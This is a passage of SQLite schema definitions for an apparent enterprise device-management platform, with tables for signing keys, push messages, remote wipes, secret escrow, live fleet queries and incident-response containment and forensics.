      last_active_at TEXT DEFAULT (DATETIME('now')),
      created_at TEXT DEFAULT (DATETIME('now')),
      updated_at TEXT DEFAULT (DATETIME('now')),
      FOREIGN KEY(policy_id) REFERENCES cloud_pc_provisioning_policies(id) ON DELETE CASCADE,
      FOREIGN KEY(host_device_id) REFERENCES devices(id) ON DELETE SET NULL
    );

    -- 97. CLOUD_PC_RESTORE_POINTS — Virtual Machine Disaster Recovery & Snapshots
    CREATE TABLE IF NOT EXISTS cloud_pc_restore_points (
      id TEXT PRIMARY KEY,
      cloud_pc_id TEXT NOT NULL,
      name TEXT NOT NULL,
      restore_point_type TEXT NOT NULL DEFAULT 'USER_SNAPSHOT' CHECK(restore_point_type IN ('AUTOMATIC_DISASTER_RECOVERY', 'USER_SNAPSHOT', 'PRE_PATCH_RESTORE')),
      size_bytes INTEGER DEFAULT 10737418240,
      captured_at TEXT DEFAULT (DATETIME('now')),
      status TEXT NOT NULL DEFAULT 'READY' CHECK(status IN ('CAPTURING', 'READY', 'RESTORING', 'EXPIRED')),
      created_at TEXT DEFAULT (DATETIME('now')),
      FOREIGN KEY(cloud_pc_id) REFERENCES cloud_pc_instances(id) ON DELETE CASCADE
    );

    CREATE INDEX IF NOT EXISTS idx_cpc_policy_target ON cloud_pc_provisioning_policies(target_group_id);
    CREATE INDEX IF NOT EXISTS idx_cpc_inst_policy ON cloud_pc_instances(policy_id);
    CREATE INDEX IF NOT EXISTS idx_cpc_inst_host ON cloud_pc_instances(host_device_id);
    CREATE INDEX IF NOT EXISTS idx_cpc_inst_status ON cloud_pc_instances(provisioning_status);
    CREATE INDEX IF NOT EXISTS idx_cpc_rp_cpc ON cloud_pc_restore_points(cloud_pc_id);
    CREATE INDEX IF NOT EXISTS idx_cpc_rp_status ON cloud_pc_restore_points(status);

    -- 98. ENTERPRISE_SIGNING_KEYS — Asymmetric PKI Certificate Authority & Code Signing Keys
    CREATE TABLE IF NOT EXISTS enterprise_signing_keys (
      id TEXT PRIMARY KEY,
      name TEXT NOT NULL,
      key_type TEXT NOT NULL DEFAULT 'RSA-4096' CHECK(key_type IN ('RSA-4096', 'RSA-2048', 'ECDSA-P384', 'ED25519')),
      public_key_pem TEXT NOT NULL,
      private_key_pem TEXT NOT NULL,
      thumbprint TEXT NOT NULL UNIQUE,
      is_active INTEGER NOT NULL DEFAULT 1,
      is_revoked INTEGER NOT NULL DEFAULT 0,
      revocation_reason TEXT,
      expires_at TEXT NOT NULL,
      created_at TEXT DEFAULT (DATETIME('now'))
    );

    -- 99. SIGNED_PAYLOAD_MANIFESTS — Cryptographic Signatures for Remote Code Execution Payloads
    CREATE TABLE IF NOT EXISTS signed_payload_manifests (
      id TEXT PRIMARY KEY,
      key_id TEXT NOT NULL,
      payload_type TEXT NOT NULL CHECK(payload_type IN ('SCRIPT', 'REMEDIATION', 'PACKAGE', 'BASELINE', 'CONFIG_PROFILE')),
      target_id TEXT,
      sha256_hash TEXT NOT NULL,
      signature_base64 TEXT NOT NULL,
      signer_thumbprint TEXT NOT NULL,
      signed_at TEXT DEFAULT (DATETIME('now')),
      FOREIGN KEY(key_id) REFERENCES enterprise_signing_keys(id) ON DELETE CASCADE
    );

    CREATE INDEX IF NOT EXISTS idx_pki_keys_thumbprint ON enterprise_signing_keys(thumbprint);
    CREATE INDEX IF NOT EXISTS idx_pki_keys_active ON enterprise_signing_keys(is_active);
    CREATE INDEX IF NOT EXISTS idx_pki_manifest_sha ON signed_payload_manifests(sha256_hash);
    CREATE INDEX IF NOT EXISTS idx_pki_manifest_target ON signed_payload_manifests(target_id);

    -- 100. REALTIME_PUSH_CHANNELS — Persistent Bi-Directional Transport Channels (WebSocket / SSE Duplex)
    CREATE TABLE IF NOT EXISTS realtime_push_channels (
      id TEXT PRIMARY KEY,
      node_id TEXT NOT NULL,
      transport_type TEXT NOT NULL DEFAULT 'WEBSOCKET' CHECK(transport_type IN ('WEBSOCKET', 'SSE_STREAM', 'LONG_POLL')),
      protocol_version TEXT NOT NULL DEFAULT 'v1.0',
      connected_at TEXT DEFAULT (DATETIME('now')),
      last_ping_at TEXT DEFAULT (DATETIME('now')),
      disconnected_at TEXT,
      status TEXT NOT NULL DEFAULT 'ACTIVE' CHECK(status IN ('ACTIVE', 'IDLE', 'DISCONNECTED')),
      client_ip TEXT DEFAULT '',
      user_agent TEXT DEFAULT '',
      FOREIGN KEY(node_id) REFERENCES devices(id) ON DELETE CASCADE
    );

    -- 101. REALTIME_PUSH_MESSAGES — Real-Time Push Message Delivery Ledger & Latency SLA
    CREATE TABLE IF NOT EXISTS realtime_push_messages (
      id TEXT PRIMARY KEY,
      node_id TEXT NOT NULL,
      topic TEXT NOT NULL CHECK(topic IN ('COMMAND', 'WIPE', 'LOCK', 'ISOLATE', 'POLICY_SYNC', 'CANCEL', 'PING')),
      payload_json TEXT NOT NULL DEFAULT '{}',
      priority TEXT NOT NULL DEFAULT 'HIGH' CHECK(priority IN ('URGENT', 'HIGH', 'NORMAL', 'LOW')),
      status TEXT NOT NULL DEFAULT 'QUEUED' CHECK(status IN ('QUEUED', 'SENT', 'ACKNOWLEDGED', 'EXPIRED', 'FAILED')),
      ttl_seconds INTEGER NOT NULL DEFAULT 300,
      dispatched_at TEXT DEFAULT (DATETIME('now')),
      delivered_at TEXT,
      acknowledged_at TEXT,
      latency_ms REAL DEFAULT NULL,
      error_message TEXT DEFAULT NULL,
      FOREIGN KEY(node_id) REFERENCES devices(id) ON DELETE CASCADE
    );

    CREATE INDEX IF NOT EXISTS idx_push_channels_node ON realtime_push_channels(node_id);
    CREATE INDEX IF NOT EXISTS idx_push_channels_status ON realtime_push_channels(status);
    CREATE INDEX IF NOT EXISTS idx_push_msg_node ON realtime_push_messages(node_id);
    CREATE INDEX IF NOT EXISTS idx_push_msg_status ON realtime_push_messages(status);
    CREATE INDEX IF NOT EXISTS idx_push_msg_dispatched ON realtime_push_messages(dispatched_at DESC);

    -- 102. AGENT_SUPERVISORS — Native Windows Service Supervisor & External Watchdog Process
    CREATE TABLE IF NOT EXISTS agent_supervisors (
      id TEXT PRIMARY KEY,
      device_id TEXT NOT NULL UNIQUE,
      service_name TEXT NOT NULL DEFAULT 'LocalPilotHostSvc',
      service_display_name TEXT NOT NULL DEFAULT 'LocalPilot Fleet Host Supervisor',
      service_status TEXT NOT NULL DEFAULT 'RUNNING' CHECK(service_status IN ('RUNNING', 'STOPPED', 'DEGRADED', 'CRASH_LOOP', 'UNINSTALLED')),
      supervisor_pid INTEGER,
      worker_pid INTEGER,
      watchdog_pid INTEGER,
      binary_path TEXT DEFAULT 'C:\\ProgramData\\LocalPilotFleet\\bin\\LocalPilotHostSvc.exe',
      binary_version TEXT DEFAULT '1.0.0',
      cpu_limit_percent INTEGER NOT NULL DEFAULT 5,
      ram_limit_mb INTEGER NOT NULL DEFAULT 150,
      job_object_active INTEGER NOT NULL DEFAULT 1 CHECK(job_object_active IN (0, 1)),
      tamper_protection_enabled INTEGER NOT NULL DEFAULT 1 CHECK(tamper_protection_enabled IN (0, 1)),
      crash_count INTEGER NOT NULL DEFAULT 0,
      last_watchdog_ping TEXT DEFAULT (DATETIME('now')),
      installed_at TEXT DEFAULT (DATETIME('now')),
      updated_at TEXT DEFAULT (DATETIME('now')),
      FOREIGN KEY(device_id) REFERENCES devices(id) ON DELETE CASCADE
    );

    -- 103. AGENT_CRASH_DUMPS — Agent Worker Crash Log Ledger & Automatic Recovery Forensics
    CREATE TABLE IF NOT EXISTS agent_crash_dumps (
      id TEXT PRIMARY KEY,
      device_id TEXT NOT NULL,
      crash_type TEXT NOT NULL DEFAULT 'UNHANDLED_EXCEPTION' CHECK(crash_type IN ('UNHANDLED_EXCEPTION', 'OUT_OF_MEMORY', 'TERMINATED_BY_USER', 'WATCHDOG_TIMEOUT', 'JOB_OBJECT_VIOLATION')),
      exit_code INTEGER NOT NULL DEFAULT 1,
      exception_message TEXT DEFAULT '',
      stack_trace TEXT DEFAULT '',
      dump_file_path TEXT DEFAULT '',
      recovery_action TEXT NOT NULL DEFAULT 'RESTARTED_WORKER' CHECK(recovery_action IN ('RESTARTED_WORKER', 'REINSTALLED_SERVICE', 'ALERT_ADMIN', 'QUARANTINED')),
      recovery_duration_ms INTEGER NOT NULL DEFAULT 1200,
      crashed_at TEXT DEFAULT (DATETIME('now')),
      recovered_at TEXT DEFAULT (DATETIME('now')),
      FOREIGN KEY(device_id) REFERENCES devices(id) ON DELETE CASCADE
    );

    CREATE INDEX IF NOT EXISTS idx_supervisor_device ON agent_supervisors(device_id);
    CREATE INDEX IF NOT EXISTS idx_supervisor_status ON agent_supervisors(service_status);
    CREATE INDEX IF NOT EXISTS idx_crash_dumps_device ON agent_crash_dumps(device_id);
    CREATE INDEX IF NOT EXISTS idx_crash_dumps_crashed_at ON agent_crash_dumps(crashed_at DESC);

    -- 104. RBAC_ROLES — Granular Role-Based Access Control Definitions
    CREATE TABLE IF NOT EXISTS rbac_roles (
      id TEXT PRIMARY KEY,
      name TEXT NOT NULL UNIQUE,
      display_name TEXT NOT NULL,
      description TEXT DEFAULT '',
      is_built_in INTEGER NOT NULL DEFAULT 0 CHECK(is_built_in IN (0, 1)),
      permissions_json TEXT NOT NULL DEFAULT '[]',
      created_at TEXT DEFAULT (DATETIME('now')),
      updated_at TEXT DEFAULT (DATETIME('now'))
    );

    CREATE INDEX IF NOT EXISTS idx_rbac_roles_name ON rbac_roles(name);
    CREATE INDEX IF NOT EXISTS idx_rbac_roles_built_in ON rbac_roles(is_built_in);

    -- 105. DUAL_CUSTODY_APPROVALS — The 4-Eyes Principle for Destructive/High-Impact Operations
    CREATE TABLE IF NOT EXISTS dual_custody_approvals (
      id TEXT PRIMARY KEY,
      action_type TEXT NOT NULL CHECK(action_type IN ('REMOTE_WIPE', 'DEVICE_DELETE', 'BULK_SCRIPT_EXECUTE', 'BITLOCKER_BULK_EXPORT', 'QUARANTINE_FLEET', 'RESET_SECURITY_BASELINE')),
      target_type TEXT NOT NULL CHECK(target_type IN ('DEVICE', 'DYNAMIC_GROUP', 'FLEET')),
      target_id TEXT NOT NULL,
      target_name TEXT DEFAULT '',
      requested_by TEXT NOT NULL,
      requested_reason TEXT NOT NULL,
      request_payload_json TEXT DEFAULT '{}',
      status TEXT NOT NULL DEFAULT 'PENDING' CHECK(status IN ('PENDING', 'APPROVED', 'REJECTED', 'EXPIRED', 'EXECUTED')),
      reviewed_by TEXT,
      reviewed_reason TEXT,
      reviewed_at TEXT,
      expires_at TEXT NOT NULL,
      executed_at TEXT,
      created_at TEXT DEFAULT (DATETIME('now'))
    );

    CREATE INDEX IF NOT EXISTS idx_dual_custody_status ON dual_custody_approvals(status);
    CREATE INDEX IF NOT EXISTS idx_dual_custody_action ON dual_custody_approvals(action_type);
    CREATE INDEX IF NOT EXISTS idx_dual_custody_expires ON dual_custody_approvals(expires_at);

    -- 106. SIEM_AUDIT_FORWARDERS — RFC 5424 Immutable Syslog & SIEM Telemetry Forwarder
    CREATE TABLE IF NOT EXISTS siem_audit_forwarders (
      id TEXT PRIMARY KEY,
      name TEXT NOT NULL,
      destination_type TEXT NOT NULL DEFAULT 'RFC5424_SYSLOG_UDP' CHECK(destination_type IN ('RFC5424_SYSLOG_UDP', 'RFC5424_SYSLOG_TCP', 'SPLUNK_HEC', 'ELASTICSEARCH', 'SENTINEL_REST')),
      host TEXT NOT NULL,
      port INTEGER NOT NULL DEFAULT 514,
      auth_token TEXT DEFAULT '',
      tls_enabled INTEGER NOT NULL DEFAULT 0 CHECK(tls_enabled IN (0, 1)),
      facility INTEGER NOT NULL DEFAULT 16,
      severity_filter TEXT NOT NULL DEFAULT 'ALL' CHECK(severity_filter IN ('ALL', 'WARNING_AND_ABOVE', 'CRITICAL_ONLY')),
      is_enabled INTEGER NOT NULL DEFAULT 1 CHECK(is_enabled IN (0, 1)),
      last_forwarded_at TEXT,
      total_events_forwarded INTEGER NOT NULL DEFAULT 0,
      last_error TEXT DEFAULT NULL,
      created_at TEXT DEFAULT (DATETIME('now')),
      updated_at TEXT DEFAULT (DATETIME('now'))
    );

    CREATE INDEX IF NOT EXISTS idx_siem_enabled ON siem_audit_forwarders(is_enabled);
    CREATE INDEX IF NOT EXISTS idx_siem_dest ON siem_audit_forwarders(destination_type);

    -- 107. MDM_CSP_CONFIGURATIONS — Native Windows OMA-DM Configuration Service Providers
    CREATE TABLE IF NOT EXISTS mdm_csp_configurations (
      id TEXT PRIMARY KEY,
      name TEXT NOT NULL,
      csp_uri TEXT NOT NULL,
      csp_type TEXT NOT NULL CHECK(csp_type IN ('GET', 'SET', 'EXEC', 'DELETE')),
      wmi_class TEXT NOT NULL DEFAULT 'MDM_BridgeWmiProvider',
      data_type TEXT NOT NULL CHECK(data_type IN ('int', 'string', 'boolean', 'xml', 'b64')),
      target_value TEXT,
      target_group_id TEXT DEFAULT 'grp-all',
      is_enforced INTEGER NOT NULL DEFAULT 1 CHECK(is_enforced IN (0, 1)),
      created_at TEXT DEFAULT (DATETIME('now')),
      updated_at TEXT DEFAULT (DATETIME('now'))
    );

    CREATE INDEX IF NOT EXISTS idx_mdm_csp_uri ON mdm_csp_configurations(csp_uri);
    CREATE INDEX IF NOT EXISTS idx_mdm_csp_enforced ON mdm_csp_configurations(is_enforced);

    -- 108. AUTOPILOT_HARDWARE_HASHES — Hardware-Rooted 4K Hashes for Windows Autopilot Zero-Touch OOBE
    CREATE TABLE IF NOT EXISTS autopilot_hardware_hashes (
      id TEXT PRIMARY KEY,
      device_id TEXT NOT NULL UNIQUE,
      hardware_hash_4k TEXT NOT NULL,
      hash_length INTEGER NOT NULL DEFAULT 4000,
      smbios_uuid TEXT NOT NULL,
      serial_number TEXT NOT NULL,
      oem_manufacturer TEXT NOT NULL,
      oem_model TEXT NOT NULL,
      enrollment_state TEXT NOT NULL DEFAULT 'ENROLLED' CHECK(enrollment_state IN ('READY', 'ENROLLED', 'PENDING_RESET', 'RETIRED')),
      harvested_at TEXT DEFAULT (DATETIME('now')),
      FOREIGN KEY(device_id) REFERENCES devices(id) ON DELETE CASCADE
    );

    CREATE INDEX IF NOT EXISTS idx_ap_hw_device ON autopilot_hardware_hashes(device_id);
    CREATE INDEX IF NOT EXISTS idx_ap_hw_state ON autopilot_hardware_hashes(enrollment_state);

    -- 109. NATIVE_REMOTE_WIPES — Native RemoteWipe CSP & TPM Crypto-Erase Ledger
    CREATE TABLE IF NOT EXISTS native_remote_wipes (
      id TEXT PRIMARY KEY,
      device_id TEXT NOT NULL,
      wipe_method TEXT NOT NULL DEFAULT 'REMOTE_WIPE_CSP' CHECK(wipe_method IN ('REMOTE_WIPE_CSP', 'DO_WIPE_PERSIST_PROVISIONING', 'DO_WIPE_PROTECTED')),
      dual_custody_approval_id TEXT,
      status TEXT NOT NULL DEFAULT 'QUEUED' CHECK(status IN ('QUEUED', 'DISPATCHED', 'EXECUTING_IN_WINRE', 'CRYPTO_ERASED_COMPLETED', 'FAILED')),
      initiated_by TEXT NOT NULL,
      initiated_at TEXT DEFAULT (DATETIME('now')),
      completed_at TEXT,
      error_message TEXT,
      FOREIGN KEY(device_id) REFERENCES devices(id) ON DELETE CASCADE
    );

    CREATE INDEX IF NOT EXISTS idx_native_wipe_device ON native_remote_wipes(device_id);
    CREATE INDEX IF NOT EXISTS idx_native_wipe_status ON native_remote_wipes(status);

    -- 110. BITS_TRANSFER_JOBS — Background Intelligent Transfer Service (BITS) & Content Distribution Queue
    CREATE TABLE IF NOT EXISTS bits_transfer_jobs (
      id TEXT PRIMARY KEY,
      job_name TEXT NOT NULL,
      device_id TEXT NOT NULL,
      source_url TEXT NOT NULL,
      target_local_path TEXT NOT NULL,
      transfer_type TEXT NOT NULL DEFAULT 'DOWNLOAD' CHECK(transfer_type IN ('DOWNLOAD', 'UPLOAD')),
      priority TEXT NOT NULL DEFAULT 'NORMAL' CHECK(priority IN ('FOREGROUND', 'HIGH', 'NORMAL', 'LOW')),
      total_bytes INTEGER NOT NULL DEFAULT 0,
      transferred_bytes INTEGER NOT NULL DEFAULT 0,
      status TEXT NOT NULL DEFAULT 'QUEUED' CHECK(status IN ('QUEUED', 'CONNECTING', 'TRANSFERRING', 'SUSPENDED', 'ERROR', 'TRANSFERRED', 'ACKNOWLEDGED', 'CANCELLED')),
      error_code TEXT,
      peer_caching_enabled INTEGER NOT NULL DEFAULT 1 CHECK(peer_caching_enabled IN (0, 1)),
      created_at TEXT DEFAULT (DATETIME('now')),
      completed_at TEXT,
      FOREIGN KEY(device_id) REFERENCES devices(id) ON DELETE CASCADE
    );

    CREATE INDEX IF NOT EXISTS idx_bits_device ON bits_transfer_jobs(device_id);
    CREATE INDEX IF NOT EXISTS idx_bits_status ON bits_transfer_jobs(status);
    CREATE INDEX IF NOT EXISTS idx_bits_priority ON bits_transfer_jobs(priority);

    -- 111. P2P_CACHE_SEEDS — Peer-to-Peer LAN Mesh & Subnet Cache Ledger
    CREATE TABLE IF NOT EXISTS p2p_cache_seeds (
      id TEXT PRIMARY KEY,
      content_sha256 TEXT NOT NULL,
      payload_name TEXT NOT NULL,
      total_size_bytes INTEGER NOT NULL DEFAULT 0,
      device_id TEXT NOT NULL,
      subnet_cidr TEXT NOT NULL DEFAULT '192.168.1.0/24',
      lan_ip TEXT NOT NULL,
      p2p_port INTEGER NOT NULL DEFAULT 7680,
      bytes_served_p2p INTEGER NOT NULL DEFAULT 0,
      is_active INTEGER NOT NULL DEFAULT 1 CHECK(is_active IN (0, 1)),
      expires_at TEXT,
      created_at TEXT DEFAULT (DATETIME('now')),
      FOREIGN KEY(device_id) REFERENCES devices(id) ON DELETE CASCADE
    );

    CREATE INDEX IF NOT EXISTS idx_p2p_sha ON p2p_cache_seeds(content_sha256);
    CREATE INDEX IF NOT EXISTS idx_p2p_subnet ON p2p_cache_seeds(subnet_cidr);
    CREATE INDEX IF NOT EXISTS idx_p2p_active ON p2p_cache_seeds(is_active);

    -- 112. DEVICE_MTLS_CERTIFICATES — Hardware TPM 2.0 Identity & Client mTLS Enrollment Ledger
    CREATE TABLE IF NOT EXISTS device_mtls_certificates (
      id TEXT PRIMARY KEY,
      device_id TEXT NOT NULL,
      cert_thumbprint TEXT NOT NULL UNIQUE,
      subject_cn TEXT NOT NULL,
      issuer_cn TEXT NOT NULL DEFAULT 'LocalPilot Root Enterprise Device CA',
      tpm_backed INTEGER NOT NULL DEFAULT 1 CHECK(tpm_backed IN (0, 1)),
      tpm_ek_pub_sha256 TEXT NOT NULL,
      key_algorithm TEXT NOT NULL DEFAULT 'RSA-2048' CHECK(key_algorithm IN ('RSA-2048', 'RSA-4096', 'ECC-P256', 'ECC-P384')),
      scep_transaction_id TEXT,
      valid_from TEXT DEFAULT (DATETIME('now')),
      valid_to TEXT NOT NULL,
      revocation_status TEXT NOT NULL DEFAULT 'ACTIVE' CHECK(revocation_status IN ('ACTIVE', 'REVOKED', 'EXPIRED')),
      revoked_at TEXT,
      revocation_reason TEXT,
      created_at TEXT DEFAULT (DATETIME('now')),
      FOREIGN KEY(device_id) REFERENCES devices(id) ON DELETE CASCADE
    );

    CREATE INDEX IF NOT EXISTS idx_mtls_device ON device_mtls_certificates(device_id);
    CREATE INDEX IF NOT EXISTS idx_mtls_thumbprint ON device_mtls_certificates(cert_thumbprint);
    CREATE INDEX IF NOT EXISTS idx_mtls_status ON device_mtls_certificates(revocation_status);

    -- 113. MULTITENANT_ORGANIZATIONS — MSP Organizations & Tenant Scopes
    CREATE TABLE IF NOT EXISTS multitenant_organizations (
      id TEXT PRIMARY KEY,
      name TEXT NOT NULL,
      slug TEXT NOT NULL UNIQUE,
      domain TEXT,
      license_tier TEXT NOT NULL DEFAULT 'ENTERPRISE' CHECK(license_tier IN ('COMMUNITY', 'PROFESSIONAL', 'ENTERPRISE')),
      max_devices INTEGER NOT NULL DEFAULT 500,
      is_active INTEGER NOT NULL DEFAULT 1 CHECK(is_active IN (0, 1)),
      created_at TEXT DEFAULT (DATETIME('now')),
      updated_at TEXT DEFAULT (DATETIME('now'))
    );

    CREATE INDEX IF NOT EXISTS idx_org_slug ON multitenant_organizations(slug);
    CREATE INDEX IF NOT EXISTS idx_org_active ON multitenant_organizations(is_active);

    -- 114. ORGANIZATION_SITES — Physical / Logical Branch Offices & Subnet Scopes
    CREATE TABLE IF NOT EXISTS organization_sites (
      id TEXT PRIMARY KEY,
      org_id TEXT NOT NULL,
      name TEXT NOT NULL,
      city TEXT,
      country TEXT DEFAULT 'US',
      subnet_cidrs_json TEXT NOT NULL DEFAULT '[]',
      bandwidth_cap_mbps INTEGER NOT NULL DEFAULT 1000,
      created_at TEXT DEFAULT (DATETIME('now')),
      FOREIGN KEY(org_id) REFERENCES multitenant_organizations(id) ON DELETE CASCADE
    );

    CREATE INDEX IF NOT EXISTS idx_site_org ON organization_sites(org_id);

    -- 115. SCOPED_DEVICE_COLLECTIONS — Tenant-Scoped Collections & Boundary Ensembles
    CREATE TABLE IF NOT EXISTS scoped_device_collections (
      id TEXT PRIMARY KEY,
      org_id TEXT NOT NULL,
      site_id TEXT,
      name TEXT NOT NULL,
      description TEXT,
      is_dynamic INTEGER NOT NULL DEFAULT 0 CHECK(is_dynamic IN (0, 1)),
      membership_rule TEXT,
      created_at TEXT DEFAULT (DATETIME('now')),
      FOREIGN KEY(org_id) REFERENCES multitenant_organizations(id) ON DELETE CASCADE,
      FOREIGN KEY(site_id) REFERENCES organization_sites(id) ON DELETE SET NULL
    );

    CREATE INDEX IF NOT EXISTS idx_sdc_org ON scoped_device_collections(org_id);
    CREATE INDEX IF NOT EXISTS idx_sdc_site ON scoped_device_collections(site_id);

    -- 116. ENTERPRISE_VAULT_SECRETS — Hardware / DPAPI-NG / AES-256-GCM Escrow Vault
    CREATE TABLE IF NOT EXISTS enterprise_vault_secrets (
      id INTEGER PRIMARY KEY AUTOINCREMENT,
      secret_id TEXT NOT NULL UNIQUE,
      secret_name TEXT NOT NULL,
      secret_scope TEXT NOT NULL CHECK(secret_scope IN ('BITLOCKER_RECOVERY_KEY', 'LAPS_PASSWORD', 'MTLS_PRIVATE_KEY', 'API_BEARER_TOKEN', 'WIFI_PRESHARED_KEY')),
      device_id TEXT,
      encrypted_payload_b64 TEXT NOT NULL,
      encryption_scheme TEXT NOT NULL DEFAULT 'AES_256_GCM_ENVELOPE_HSM' CHECK(encryption_scheme IN ('AES_256_GCM_ENVELOPE_HSM', 'DPAPI_NG_LOCAL_MACHINE', 'RSA_4096_PKI')),
      key_descriptor TEXT,
      auth_tag_hex TEXT,
      iv_hex TEXT,
      rotation_interval_days INTEGER NOT NULL DEFAULT 30,
      last_rotated_at TEXT DEFAULT (DATETIME('now')),
      expires_at TEXT,
      is_active INTEGER NOT NULL DEFAULT 1 CHECK(is_active IN (0, 1)),
      created_at TEXT DEFAULT (DATETIME('now')),
      updated_at TEXT DEFAULT (DATETIME('now'))
    );

    CREATE INDEX IF NOT EXISTS idx_vault_secret_id ON enterprise_vault_secrets(secret_id);
    CREATE INDEX IF NOT EXISTS idx_vault_device ON enterprise_vault_secrets(device_id);
    CREATE INDEX IF NOT EXISTS idx_vault_scope ON enterprise_vault_secrets(secret_scope);

    -- 117. VAULT_ACCESS_AUDITS — Non-Repudiation Audit Ledger for Hardware Vault
    CREATE TABLE IF NOT EXISTS vault_access_audits (
      id INTEGER PRIMARY KEY AUTOINCREMENT,
      secret_id TEXT NOT NULL,
      action TEXT NOT NULL CHECK(action IN ('STORE', 'RETRIEVE_ENCRYPTED', 'DECRYPT_AUTHORIZED', 'ROTATED', 'REVOKED', 'ACCESS_DENIED')),
      actor TEXT NOT NULL,
      caller_ip TEXT DEFAULT '127.0.0.1',
      dual_custody_ref_id TEXT,
      status TEXT NOT NULL CHECK(status IN ('SUCCESS', 'DENIED_UNAUTHORIZED', 'DENIED_TAMPER')),
      details_json TEXT DEFAULT '{}',
      created_at TEXT DEFAULT (DATETIME('now'))
    );

    CREATE INDEX IF NOT EXISTS idx_vault_audit_secret ON vault_access_audits(secret_id);
    CREATE INDEX IF NOT EXISTS idx_vault_audit_created ON vault_access_audits(created_at);

    -- 118. LIVE_FLEET_QUERIES — CMPivot / Tanium Real-Time Distributed Query Sessions
    CREATE TABLE IF NOT EXISTS live_fleet_queries (
      id TEXT PRIMARY KEY,
      query_text TEXT NOT NULL,
      query_type TEXT NOT NULL DEFAULT 'CMPIVOT_KQL' CHECK(query_type IN ('CMPIVOT_KQL', 'OSQUERY_SQL', 'POWERSHELL_CIM', 'FILE_SEARCH', 'REGISTRY_PROBE')),
      target_scope TEXT NOT NULL DEFAULT 'ALL_FLEET' CHECK(target_scope IN ('ALL_FLEET', 'COLLECTION', 'DEVICE', 'DYNAMIC_GROUP')),
      target_id TEXT,
      status TEXT NOT NULL DEFAULT 'STREAMING' CHECK(status IN ('DISPATCHED', 'STREAMING', 'COMPLETED', 'CANCELLED', 'TIMED_OUT')),
      total_targets INTEGER NOT NULL DEFAULT 1,
      responded_targets INTEGER NOT NULL DEFAULT 0,
      initiated_by TEXT NOT NULL DEFAULT 'Global Administrator',
      created_at TEXT DEFAULT (DATETIME('now')),
      completed_at TEXT
    );

    CREATE INDEX IF NOT EXISTS idx_lfq_status ON live_fleet_queries(status);
    CREATE INDEX IF NOT EXISTS idx_lfq_created ON live_fleet_queries(created_at);

    -- 119. LIVE_QUERY_RESULTS — Ingested Tabular Result Rows from Endpoints
    CREATE TABLE IF NOT EXISTS live_query_results (
      id INTEGER PRIMARY KEY AUTOINCREMENT,
      query_id TEXT NOT NULL,
      device_id TEXT NOT NULL,
      hostname TEXT NOT NULL,
      data_row_json TEXT NOT NULL,
      execution_duration_ms INTEGER NOT NULL DEFAULT 0,
      received_at TEXT DEFAULT (DATETIME('now')),
      FOREIGN KEY(query_id) REFERENCES live_fleet_queries(id) ON DELETE CASCADE
    );

    CREATE INDEX IF NOT EXISTS idx_lqr_query ON live_query_results(query_id);
    CREATE INDEX IF NOT EXISTS idx_lqr_device ON live_query_results(device_id);

    -- 120. LIVE_QUERY_ENTITIES — CMPivot Entity & Sensor Catalog
    CREATE TABLE IF NOT EXISTS live_query_entities (
      entity_name TEXT PRIMARY KEY,
      category TEXT NOT NULL,
      description TEXT NOT NULL,
      sample_query TEXT NOT NULL,
      powershell_extractor TEXT NOT NULL,
      created_at TEXT DEFAULT (DATETIME('now'))
    );

    CREATE INDEX IF NOT EXISTS idx_lqe_cat ON live_query_entities(category);

    -- 121. INCIDENT_RESPONSE_PLAYBOOKS — Automated IR Containment & Triage Playbooks
    CREATE TABLE IF NOT EXISTS incident_response_playbooks (
      id TEXT PRIMARY KEY,
      name TEXT NOT NULL,
      description TEXT,
      trigger_event_type TEXT NOT NULL CHECK(trigger_event_type IN ('RANSOMWARE_SUSPECT', 'ROGUE_ADMIN', 'MALWARE_DETECTED', 'BRUTE_FORCE_LOGIN', 'TAMPER_DETECTED', 'PROCESS_INJECTION', 'ALL_CRITICAL')),
      actions_json TEXT NOT NULL DEFAULT '["ISOLATE_NETWORK", "COLLECT_TRIAGE"]',
      target_scope TEXT NOT NULL DEFAULT 'ALL_FLEET' CHECK(target_scope IN ('ALL_FLEET', 'DYNAMIC_GROUP', 'ORGANIZATION')),
      target_id TEXT,
      require_dual_custody INTEGER NOT NULL DEFAULT 0 CHECK(require_dual_custody IN (0, 1)),
      is_enabled INTEGER NOT NULL DEFAULT 1 CHECK(is_enabled IN (0, 1)),
      created_at TEXT DEFAULT (DATETIME('now')),
      updated_at TEXT DEFAULT (DATETIME('now'))
    );

    CREATE INDEX IF NOT EXISTS idx_irp_trigger ON incident_response_playbooks(trigger_event_type);
    CREATE INDEX IF NOT EXISTS idx_irp_enabled ON incident_response_playbooks(is_enabled);

    -- 122. HOST_CONTAINMENT_STATES — Network Isolation & Quarantine Ledger
    CREATE TABLE IF NOT EXISTS host_containment_states (
      device_id TEXT PRIMARY KEY,
      containment_status TEXT NOT NULL DEFAULT 'UNCONTAINED' CHECK(containment_status IN ('UNCONTAINED', 'CONTAINED', 'RELEASE_PENDING')),
      isolation_type TEXT NOT NULL DEFAULT 'ALLOW_FLEET_MANAGEMENT_ONLY' CHECK(isolation_type IN ('ALLOW_FLEET_MANAGEMENT_ONLY', 'TOTAL_AIR_GAP')),
      isolated_at TEXT,
      isolated_by TEXT,
      reason TEXT,
      playbook_id TEXT,
      firewall_rule_name TEXT DEFAULT 'LocalPilot-Isolation-Block-All',
      updated_at TEXT DEFAULT (DATETIME('now')),
      FOREIGN KEY(device_id) REFERENCES devices(id) ON DELETE CASCADE,
      FOREIGN KEY(playbook_id) REFERENCES incident_response_playbooks(id) ON DELETE SET NULL
    );

    CREATE INDEX IF NOT EXISTS idx_hcs_status ON host_containment_states(containment_status);

    -- 123. FORENSIC_TRIAGE_PACKAGES — Forensic Artifact Acquisitions & Memory Snapshots
    CREATE TABLE IF NOT EXISTS forensic_triage_packages (
      id TEXT PRIMARY KEY,
      device_id TEXT NOT NULL,
      hostname TEXT NOT NULL,
      package_name TEXT NOT NULL,
      trigger_source TEXT NOT NULL DEFAULT 'MANUAL_ADMIN' CHECK(trigger_source IN ('MANUAL_ADMIN', 'PLAYBOOK_AUTOMATION', 'SECURITY_EVENT')),
      trigger_event_id INTEGER,
      status TEXT NOT NULL DEFAULT 'QUEUED' CHECK(status IN ('QUEUED', 'COLLECTING', 'COMPLETED', 'FAILED')),
      file_path TEXT,
      file_size_bytes INTEGER NOT NULL DEFAULT 0,
      sha256_hash TEXT,
      artifacts_collected_json TEXT NOT NULL DEFAULT '["ProcessTree", "NetworkConnections", "Prefetch", "EventLogs"]',
      execution_time_ms INTEGER NOT NULL DEFAULT 0,
      created_at TEXT DEFAULT (DATETIME('now')),
      completed_at TEXT,
